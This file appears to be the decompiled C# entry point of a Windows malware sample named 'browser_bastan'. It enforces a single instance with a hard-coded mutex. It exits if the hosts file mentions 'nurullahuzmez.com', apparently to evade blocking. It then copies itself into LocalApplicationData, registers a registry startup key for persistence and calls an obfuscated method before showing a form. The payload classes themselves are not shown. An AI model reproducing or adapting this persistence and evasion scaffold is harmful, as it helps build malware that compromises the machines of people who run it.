using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace browser_bastan;

internal static class Program
{
	public static Mutex AppMutex;

	[STAThread]
	private static void Main()
	{
		if (AppMutex.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			CheckHostsFile();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Araclar.DstName;
			Araclar.DstCheck();
			Araclar.Startup(Araclar.Regkeyname, path);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Class2.EgewcaxzjFA5r();
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			AppMutex.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public static void CheckHostsFile()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}

	static Program()
	{
		AppMutex = new Mutex(initiallyOwned: true, "{3X4T1EK7-C3H5-78kl-N3SR-94F04X6FDKLM}");
	}
}
